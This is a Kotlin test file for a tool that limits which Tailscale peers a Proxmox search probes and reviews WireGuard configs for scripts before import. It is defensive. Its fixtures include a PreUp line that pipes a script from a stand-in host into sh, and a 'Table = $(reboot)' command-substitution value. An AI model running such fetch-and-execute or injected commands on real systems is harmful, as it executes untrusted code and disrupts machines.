package local.ringleader.core

import java.nio.file.Files
import kotlin.test.*
import kotlinx.coroutines.flow.toList
import kotlinx.coroutines.runBlocking

/**
 * Search and import safety after the 2026-11-16 audit (U1, U2): which tailnet peers the Proxmox search may probe, and what
 * the WireGuard import confirmation must say about a file. Synthetic data only; no key material is real.
 */
class TailnetAndImportSafetyTest {
    // ------------------------------------------------------------------ tailnet search

    private fun status(peers: String, self: String = """"UserID":7""") = parseTailscaleStatus("""
        {"BackendState":"Running","Self":{"ID":"self","HostName":"desk","TailscaleIPs":["100.64.0.1"],"Online":true,$self},"Peer":{$peers}}
    """.trimIndent())

    private val mixed = """
        "own":{"ID":"own","HostName":"pve1","TailscaleIPs":["100.64.0.10"],"Online":true,"UserID":7},
        "tag":{"ID":"tag","HostName":"pve-b","TailscaleIPs":["100.64.0.11"],"Online":true,"UserID":555,"Tags":["tag:server"]},
        "mull":{"ID":"mull","HostName":"se-sto-wg-001","TailscaleIPs":["100.64.1.5"],"Online":true,"ExitNodeOption":true,"Location":{"Country":"Sweden","CountryCode":"SE"}},
        "share":{"ID":"share","HostName":"friend-nas","TailscaleIPs":["100.64.1.6"],"Online":true,"ShareeNode":true,"UserID":99},
        "other":{"ID":"other","HostName":"coworker-laptop","TailscaleIPs":["100.64.1.7"],"Online":true,"UserID":8},
        "off":{"ID":"off","HostName":"old-share","TailscaleIPs":["100.64.1.8"],"Online":false,"ShareeNode":true},
        "unknown":{"ID":"unknown","HostName":"no-user","TailscaleIPs":["100.64.1.9"],"Online":true}
    """

    private fun probed(s: TailscaleStatus, include: Boolean): Set<String> = runBlocking {
        val seen = mutableSetOf<String>()
        findTailnetProxmox(s, NetworkScanner { ip, _ -> synchronized(seen) { seen += ip }; emptyList() }, plan = planTailnetSearch(s, include)).toList()
        seen
    }

    @Test fun locationPeersAreNeverProbedAndOthersOnlyWhenIncluded() {
        val s = status(mixed)
        assertEquals(setOf("100.64.0.10", "100.64.0.11", "100.64.1.9"), probed(s, include = false), "own, tagged and unattributed peers")
        assertEquals(setOf("100.64.0.10", "100.64.0.11", "100.64.1.6", "100.64.1.7", "100.64.1.9"), probed(s, include = true), "Mullvad stays out even when included")
        val plan = planTailnetSearch(s)
        assertEquals(1, plan.skippedLocation); assertEquals(2, plan.skippedShared); assertFalse(plan.includeShared)
        val included = planTailnetSearch(s, includeShared = true)
        assertEquals(1, included.skippedLocation); assertEquals(0, included.skippedShared)
    }

    @Test fun peopleAreComparedOnlyWhenTheyCanBe() {
        val self = status("").self
        val peer = TailscalePeer("p", "x", null, null, true, listOf("100.64.0.9"), false, false, null, null, null, null, null, userId = 8)
        assertTrue(ownedBySomeoneElse(peer, self))
        assertFalse(ownedBySomeoneElse(peer.copy(userId = 7), self))
        assertFalse(ownedBySomeoneElse(peer.copy(tags = listOf("tag:pve")), self), "a tagged node belongs to the tailnet")
        assertTrue(ownedBySomeoneElse(peer.copy(tags = listOf("tag:pve"), sharee = true), self), "shared in is shared in, tagged or not")
        assertFalse(ownedBySomeoneElse(peer.copy(userId = null), self))
        assertFalse(ownedBySomeoneElse(peer, self?.copy(userId = null)), "this computer's user is not reported")
        assertFalse(ownedBySomeoneElse(peer, self?.copy(tags = listOf("tag:desk"))), "a tagged computer cannot compare people")
        assertFalse(ownedBySomeoneElse(peer, null))
        // A tagged RingMASTER computer still leaves shared-in nodes out.
        assertEquals(setOf("100.64.0.10", "100.64.0.11", "100.64.1.7", "100.64.1.9"), probed(status(mixed, self = """"UserID":42,"Tags":["tag:desk"]"""), include = false))
    }

    @Test fun skipNoteCountsAndExplains() {
        assertEquals("Not searched: 1 location-based exit node (a VPN provider's servers, never searched); 2 machines shared by others or owned by another user (tick the box to include them).",
            tailnetSkipNote(planTailnetSearch(status(mixed))))
        assertEquals("Not searched: 1 location-based exit node (a VPN provider's servers, never searched).", tailnetSkipNote(planTailnetSearch(status(mixed), includeShared = true)))
        assertNull(tailnetSkipNote(planTailnetSearch(status(""""own":{"ID":"own","HostName":"pve1","TailscaleIPs":["100.64.0.10"],"Online":true,"UserID":7}"""))))
        val two = status(""""a":{"ID":"a","HostName":"a","TailscaleIPs":["100.64.1.1"],"Online":true,"Location":{}},"b":{"ID":"b","HostName":"b","TailscaleIPs":["100.64.1.2"],"Online":true,"Location":{}},
            "c":{"ID":"c","HostName":"c","TailscaleIPs":["100.64.1.3"],"Online":true,"ShareeNode":true}""")
        assertEquals("Not searched: 2 location-based exit nodes (a VPN provider's servers, never searched); 1 machine shared by others or owned by another user (tick the box to include them).",
            tailnetSkipNote(planTailnetSearch(two)))
        assertFalse(tailnetSkipNote(planTailnetSearch(status(mixed)))!!.contains("friend"), "counts only, never names")
    }

    // ------------------------------------------------------------------ WireGuard import review

    private val key = "A".repeat(43) + "="

    @Test fun reviewFindsScriptsTableSaveConfigAndFullTunnelInAnyCase() {
        val text = "[interface]\r\nPrivateKey = $key\r\n  postup=iptables -A FORWARD -i %i -j ACCEPT; echo $key\r\nPREDOWN = echo bye\r\n" +
            "PreUp\t=\tcurl https://example.invalid/x.sh | sh\r\npostDown = true # comment\r\nTABLE = off\r\nSaveConfig = TRUE\r\n" +
            "# PostUp = commented out\r\n[ Peer ]\r\nPublicKey = $key\r\nAllowedIPs = 10.0.0.0/8, 0.0.0.0/0 ,::/0\r\nEndpoint = vpn.example.invalid:51820\r\n"
        val r = reviewWireGuardConfig(text)
        assertTrue(r.isConfig)
        assertEquals(listOf("PostUp", "PreDown", "PreUp", "PostDown"), r.scripts)
        assertEquals("off", r.table); assertTrue(r.saveConfig); assertEquals(listOf("0.0.0.0/0", "::/0"), r.fullTunnel)
        val shown = r.toString() + wireGuardReviewLines(r, WireGuardScriptPolicy.RunAsSystem).joinToString()
        for (secret in listOf(key, "iptables", "curl", "example.invalid", "echo")) assertFalse(secret in shown, "$secret shown")
    }

    @Test fun reviewOddShapes() {
        assertFalse(reviewWireGuardConfig("PrivateKey = x").isConfig)
        assertFalse(reviewWireGuardConfig("").isConfig)
        assertTrue(reviewWireGuardConfig(" [ INTERFACE ] \n").isConfig)
        val plain = reviewWireGuardConfig("[Interface]\nPrivateKey = $key\nAddress = 10.8.0.2/24\n[Peer]\nPublicKey = $key\nAllowedIPs = 10.8.0.0/24\n")
        assertFalse(plain.hasFindings); assertTrue(wireGuardReviewLines(plain, WireGuardScriptPolicy.RunAsSystem).isEmpty())
        assertEquals("set", reviewWireGuardConfig("[Interface]\nTable = \$(reboot)\n").table, "an odd Table value is not echoed")
        assertFalse(reviewWireGuardConfig("[Interface]\nSaveConfig = false\n").saveConfig)
        assertEquals(listOf("::/0"), reviewWireGuardConfig("[Interface]\n[Peer]\nAllowedIPs=::0/0\n").fullTunnel)
        assertEquals(emptyList(), reviewWireGuardConfig("[Interface]\n[Peer]\nAllowedIPs = 0.0.0.0/1, 128.0.0.0/1\n").fullTunnel)
        assertEquals(listOf("PostUp"), reviewWireGuardConfig("[Interface]\n[Peer]\nPostUp = x\n").scripts, "listed wherever it appears")
        assertEquals(emptyList(), reviewWireGuardConfig("[Interface]\nPostUpX = x\nPost Up = y\n=PostUp\n").scripts)
    }

    @Test fun readIsBounded() {
        val dir = Files.createTempDirectory("wg-review")
        try {
            val big = dir.resolve("big.conf"); Files.writeString(big, "[Interface]\n" + "#".repeat(70_000))
            assertTrue(readWireGuardReview(big).tooLarge); assertFalse(readWireGuardReview(big).isConfig)
            val ok = dir.resolve("ok.conf"); Files.writeString(ok, "[Interface]\nPostUp = x\n")
            assertEquals(listOf("PostUp"), readWireGuardReview(ok).scripts)
        } finally { dir.toFile().deleteRecursively() }
    }

    @Test fun reviewLinesPerPolicy() {
        val r = reviewWireGuardConfig("[Interface]\nPostUp = x\nPreDown = y\n")
        val system = wireGuardReviewLines(r, WireGuardScriptPolicy.RunAsSystem)
        assertEquals("PostUp: a script (a command line that runs when the tunnel comes up)", system[0])
        assertEquals("PreDown: a script (a command line that runs when the tunnel goes down)", system[1])
        assertTrue(system[2].contains("will run as Local System"))
        assertTrue(wireGuardReviewLines(r, WireGuardScriptPolicy.Unknown)[2].contains("could not be read") && wireGuardReviewLines(r, WireGuardScriptPolicy.Unknown)[2].contains("Local System"))
        assertTrue(wireGuardReviewLines(r, WireGuardScriptPolicy.NotRun)[2].contains("will not run"))
        assertTrue(wireGuardReviewLines(r, WireGuardScriptPolicy.DroppedOnImport)[2].contains("NetworkManager does not run these scripts"))
        assertTrue(wireGuardScriptsNeedConsent(r, WireGuardScriptPolicy.RunAsSystem)); assertTrue(wireGuardScriptsNeedConsent(r, WireGuardScriptPolicy.Unknown))
        assertFalse(wireGuardScriptsNeedConsent(r, WireGuardScriptPolicy.NotRun)); assertFalse(wireGuardScriptsNeedConsent(r, WireGuardScriptPolicy.DroppedOnImport))
        assertFalse(wireGuardScriptsNeedConsent(reviewWireGuardConfig("[Interface]\nTable = off\n"), WireGuardScriptPolicy.RunAsSystem))
    }

    @Test fun registryValueParsing() {
        assertEquals(true, parseDangerousScriptExecution("\r\nHKEY_LOCAL_MACHINE\\Software\\WireGuard\r\n    DangerousScriptExecution    REG_DWORD    0x1\r\n\r\n"))
        assertEquals(false, parseDangerousScriptExecution("    DangerousScriptExecution    REG_DWORD    0x0"))
        assertEquals(false, parseDangerousScriptExecution("    DangerousScriptExecution    REG_DWORD    0x2"))
        assertEquals(true, parseDangerousScriptExecution("    dangerousscriptexecution    REG_DWORD    1"))
        assertNull(parseDangerousScriptExecution("HKEY_LOCAL_MACHINE\\Software\\WireGuard\r\n    LimitedOperatorUI    REG_DWORD    0x1"))
        assertNull(parseDangerousScriptExecution(""))
    }

    // ------------------------------------------------------------------ backend: policy read and the import gate

    private val wgExe = "C:\\Program Files\\WireGuard\\wireguard.exe"

    private fun windows(reg: (List<String>) -> String, calls: MutableList<List<String>>, record: java.nio.file.Path) =
        LocalVpnBackend("Windows", { c, _ -> calls += c; if (c.first().endsWith("reg.exe")) reg(c) else "{}" }, { if (it == wgExe) it else null }, WireGuardImports(record), hostActions = true)

    @Test fun windowsReadsTheRegistryOnlyToReadIt() {
        val calls = mutableListOf<List<String>>()
        val record = Files.createTempDirectory("wg-rec").resolve("imports.json")
        assertEquals(WireGuardScriptPolicy.RunAsSystem, windows({ "    DangerousScriptExecution    REG_DWORD    0x1" }, calls, record).wireGuardScriptPolicy())
        assertEquals(listOf(windowsReg(), "query", "HKLM\\Software\\WireGuard", "/v", "DangerousScriptExecution", "/reg:64"), calls.single(), "a query, nothing else")
        assertEquals(WireGuardScriptPolicy.NotRun, windows({ "    DangerousScriptExecution    REG_DWORD    0x0" }, calls, record).wireGuardScriptPolicy())
        assertEquals(WireGuardScriptPolicy.NotRun, windows({ error("ERROR: The system was unable to find the specified registry key or value.") }, calls, record).wireGuardScriptPolicy(), "absent is WireGuard's default")
        assertEquals(WireGuardScriptPolicy.Unknown, windows({ error("Zugriff verweigert") }, calls, record).wireGuardScriptPolicy(), "any other failure is not proof of safety")
        assertEquals(WireGuardScriptPolicy.DroppedOnImport, LocalVpnBackend("Linux", { _, _ -> error("not called") }, { it }, hostActions = true).wireGuardScriptPolicy())
    }

    @Test fun windowsRefusesScriptsThatWouldRunAsSystemUnlessAccepted() {
        val dir = Files.createTempDirectory("wg-gate")
        try {
            val conf = dir.resolve("office.conf"); Files.writeString(conf, "[Interface]\nPrivateKey = $key\nPostUp = whoami\n")
            val calls = mutableListOf<List<String>>()
            val b = windows({ "    DangerousScriptExecution    REG_DWORD    0x1" }, calls, dir.resolve("imports.json"))
            val e = assertFailsWith<IllegalStateException> { b.importWireGuard(conf, "office") }
            assertEquals("This configuration has scripts that WireGuard would run as Local System. Nothing was imported.", e.message)
            assertFailsWith<IllegalStateException> { b.importWireGuardReviewed(conf, "office", scriptsAccepted = false) }
            assertTrue(calls.none { it.first() == windowsPowerShell() }, "nothing was elevated")
            assertEquals("wg:office", b.importWireGuardReviewed(conf, "office", scriptsAccepted = true))
            assertEquals(1, calls.count { it.first() == windowsPowerShell() })
            // Scripts that WireGuard will not run need no consent; neither does a plain file.
            val off = windows({ error("ERROR: The system was unable to find the specified registry key or value.") }, mutableListOf(), dir.resolve("imports2.json"))
            assertEquals("wg:second", off.importWireGuard(conf.also { }, "second"))
            val plainCalls = mutableListOf<List<String>>()
            val plain = dir.resolve("plain.conf"); Files.writeString(plain, "[Interface]\nPrivateKey = $key\n")
            assertEquals("wg:plain", windows({ error("reg must not be asked") }, plainCalls, dir.resolve("imports3.json")).importWireGuard(plain, "plain"))
            assertTrue(plainCalls.none { it.first().endsWith("reg.exe") }, "no registry read for a file without scripts")
            // An unreadable registry needs consent too.
            assertFailsWith<IllegalStateException> { windows({ error("Zugriff verweigert") }, mutableListOf(), dir.resolve("imports4.json")).importWireGuard(conf, "fourth") }
        } finally { dir.toFile().deleteRecursively() }
    }

    @Test fun refusedFilesSayWhy() {
        val dir = Files.createTempDirectory("wg-refuse")
        try {
            val b = windows({ "" }, mutableListOf(), dir.resolve("imports.json"))
            val big = dir.resolve("big.conf"); Files.writeString(big, "[Interface]\n" + "#".repeat(70_000))
            assertEquals("That file is too large to be a WireGuard configuration.", assertFailsWith<IllegalArgumentException> { b.importWireGuard(big, "big") }.message)
            val wrong = dir.resolve("wrong.conf"); Files.writeString(wrong, "not a config")
            assertEquals("That file is not a WireGuard configuration.", assertFailsWith<IllegalArgumentException> { b.importWireGuard(wrong, "wrong") }.message)
        } finally { dir.toFile().deleteRecursively() }
    }
}
